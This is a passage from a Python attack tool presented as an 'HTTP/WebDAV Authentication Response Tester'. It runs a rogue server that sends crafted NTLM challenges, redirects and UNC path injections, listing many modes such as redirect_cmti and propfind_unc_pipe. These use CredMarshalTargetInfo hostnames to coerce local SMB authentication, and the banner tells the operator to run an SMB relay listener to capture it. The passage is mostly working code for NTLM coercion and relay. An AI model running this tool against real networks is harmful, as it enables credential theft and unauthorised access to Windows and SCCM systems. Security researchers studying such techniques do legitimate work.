            print(f"    Response: 401 with NTLM challenge + LOCAL_CALL hint")
        else:
            self.send_header('WWW-Authenticate', 'NTLM')
            self.send_header('X-NTLM-Context', 'LOCAL_CALL')
            print(f"    Response: 401 with LOCAL_CALL hint")

        self.send_header('Content-Length', '0')
        self.end_headers()

    def send_redirect_then_auth(self, client_flags=None):
        """Redirect followed by auth on second request"""
        if hasattr(self.server, 'redirect_done'):
            self.send_ntlm_401(client_flags)
        else:
            self.server.redirect_done = True
            self.send_redirect('http://127.0.0.1/')

    def send_auth_with_location(self, cmti, client_flags=None):
        """401 with both auth and Location header"""
        location = f'http://{cmti}/' if cmti else 'http://localhost/'
        self.send_response(401)

        if client_flags is not None:
            challenge_msg, flags = generate_ntlm_challenge(client_flags)
            challenge_b64 = base64.b64encode(challenge_msg).decode('ascii')
            self.send_header('WWW-Authenticate', f'NTLM {challenge_b64}')
            print(f"    Response: 401 with NTLM challenge + Location: {location}")
        else:
            self.send_header('WWW-Authenticate', 'NTLM')
            print(f"    Response: 401 with NTLM + Location: {location}")

        self.send_header('Location', location)
        self.send_header('Content-Length', '0')
        self.end_headers()

def main():
    parser = argparse.ArgumentParser(description='HTTP/WebDAV Authentication Response Tester with NTLM Challenge Generation and UNC Path Injection')
    parser.add_argument('-p', '--port', type=int, default=80, help='Port to listen on (default: 80)')
    parser.add_argument('-i', '--interface', default='0.0.0.0', help='Interface to bind to (default: 0.0.0.0)')
    parser.add_argument('-m', '--mode',
                       default='ntlm_401',
                       help='Response mode to test (see --list-modes)')
    parser.add_argument('--cmti', type=str, help='CredMarshalTargetInfo address (e.g., sccm-sitesrv1UWhRC...)')
    parser.add_argument('--all', action='store_true', help='Cycle through ALL response modes')
    parser.add_argument('--list-modes', action='store_true', help='List all available modes')
    parser.add_argument('-o', '--output', type=str, default='http_auth_test.log',
                       help='Output log file (default: http_auth_test.log)')

    args = parser.parse_args()

    modes = {
        'Standard Auth': ['ntlm_401', 'negotiate_401', 'basic_401', 'digest_401', 'multi_401'],
        'Proxy Auth': ['proxy_407', 'proxy_negotiate_407'],
        'Redirects (Generic)': ['redirect_localhost', 'redirect_127', 'redirect_loopback', 'redirect_localwithauth',
                                'redirect_self_host', 'redirect_davwwwroot'],
        'Redirects (CMTI)': ['redirect_cmti', 'redirect_cmti_davwwwroot', 'redirect_cmti_withauth',
                             'redirect_cmti_port80', 'redirect_cmti_scheme_only'],
        'WebDAV Specific': ['webdav_multistatus', 'webdav_multistatus_cmti', 'webdav_locked',
                           'webdav_insufficient_storage', 'webdav_method_not_allowed'],
        'UNC/CMTI Cross-Protocol': ['propfind_unc_cmti', 'propfind_unc_redirect', 'propfind_collection_unc',
                                     'location_unc', 'propfind_unc_pipe', 'propfind_unc_variants'],
        'Alternative Status': ['auth_408', 'auth_511', 'auth_426', 'auth_305'],
        'Custom Headers': ['persist_auth', 'negotiate_krb_only', 'ntlm_no_negotiate', 'challenge_local_call'],
        'Combined': ['redirect_then_auth', 'auth_with_location']
    }

    if args.list_modes:
        print("\n[*] Available modes:\n")
        for category, mode_list in modes.items():
            print(f"  {category}:")
            for mode in mode_list:
                print(f"    - {mode}")
        print()
        return

    # Build all modes list for --all flag
    all_modes_list = []
    for mode_list in modes.values():
        all_modes_list.extend(mode_list)

    # Set up logging to both file and stdout
    sys.stdout = TeeLogger(args.output)

    print(f"""
{'='*80}
HTTP/WebDAV Authentication Response Tester
with NTLM Challenge Generation and UNC Path Injection
{'='*80}
Listening on: {args.interface}:{args.port}
Mode: {'ALL (cycling through all modes)' if args.all else args.mode}
CMTI: {args.cmti if args.cmti else 'Not set (use --cmti)'}
Output file: {args.output}

Features:
- Proper NTLM Type 2 CHALLENGE responses
- UNC path injection for cross-protocol attacks (HTTP->SMB)
- CMTI hostname in UNC paths to trigger local SMB auth
- Full NTLM token parsing and analysis
- Detection of empty credentials (local auth indicator)

IMPORTANT: When testing UNC modes, also run an SMB relay listener
           to capture the cross-protocol SMB connection!

All output is being logged to: {args.output}

Use --list-modes to see all available response modes
Use --all to cycle through ALL modes (each request gets a different response)
Use --cmti <address> to test CMTI-specific attacks
{'='*80}

Waiting for connections...
    """)

    server = HTTPServer((args.interface, args.port), AuthTesterHandler)
    server.mode = args.mode
    server.cmti = args.cmti
    server.all_mode = args.all
    server.all_modes = all_modes_list
    server.all_mode_index = 0
    server.request_count = 1

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Shutting down...")
        print(f"[*] Total requests processed: {server.request_count - 1}")
        print(f"[*] Full log saved to: {args.output}")
        server.shutdown()

if __name__ == '__main__':
    main()
